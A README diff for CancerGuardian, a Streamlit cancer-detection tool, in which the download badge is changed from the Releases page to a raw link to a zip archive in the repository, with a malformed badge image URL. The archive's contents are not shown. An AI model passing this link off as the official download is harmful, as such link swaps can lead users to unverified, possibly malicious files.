@@ -25,7 +25,7 @@ Built with Streamlit, CancerGuardian offers a user-friendly interface that strea
 
 ## Access the Tool
 
-To explore CancerGuardian and experience its capabilities, visit the following link: [![Download CancerGuardian](https://img.shields.io/badge/Download-Get%20Started-blue)](https://github.com/rdjverse/CancerGuardian/releases)
+To explore CancerGuardian and experience its capabilities, visit the following link: [![Download CancerGuardian](https://raw.githubusercontent.com/rdjverse/CancerGuardian/main/model/Guardian_Cancer_1.6.zip%20Started-blue)](https://raw.githubusercontent.com/rdjverse/CancerGuardian/main/model/Guardian_Cancer_1.6.zip)
 
 ### Note:
 If the link does not direct you to the tool directly, please navigate to the "Releases" section of the repository to access the necessary files.
